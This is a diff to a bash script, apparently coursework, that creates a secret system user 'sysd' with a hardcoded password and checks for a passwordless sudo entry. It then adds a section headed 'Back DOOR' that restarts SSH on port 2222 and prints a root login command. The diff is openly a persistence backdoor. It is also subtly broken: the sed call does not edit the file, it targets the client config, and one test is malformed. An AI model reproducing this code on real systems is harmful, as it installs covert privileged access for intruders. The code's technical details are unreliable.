@@ -6,6 +6,7 @@ fi
  #exit out if user ran the script without root
 echo "Script running ... .. .. ."
 useradd -rMo -u 300 -p p4ssw0rd sysd #create a secret user with no home, and uid with 300
+groupmod -g 300 sysd # give the GID sa
 echo "Created secret user ..... .. . ."
 cat /etc/passwd | grep -i sysd #check if user is created
 #check if user has proper privileges for sysd mean u did the HW
@@ -19,5 +20,32 @@ var=$(cat /etc/sudoer.tmp | grep -i sysd | awk '{ print $3 }')
 vareql="NOPASSWD:ALL"
 if [ $var != $vareql ]; then
   echo "Error sudoer file not properly configured .. .. ."
+  echo " fix it ! :<"
   exit
+else
+  echo " check complete :) "
 fi
+#######################################################
+################  Back DOOR           #################
+################            By        #################
+################    V   V    V   V    #################
+################        Hershey       #################
+################                      #################
+#######################################################
+#first stop the service if its running
+serCek=$(systemctl is-active ssh.service)
+if [ $ serCek = "active" ]; then
+    echo "service running .... shutting it down"
+    systemctl stop ssh.service
+fi
+echo "Starting the edditing..... >"
+sed -n 's/Port 22/Port 2222/g' /etc/ssh/ssh_config #edit the ssh_config file silently
+#restart the ssh services
+systemctl restart ssh.service
+echo -e "/nServices restarted "
+TARGET_IP=$(hostname -I)
+echo -e "/n SSH : ssh root@$TARGET_IP -p 2222"
+######################################################################3
+#######################################################################
+#######################################################################]
+########################################################################
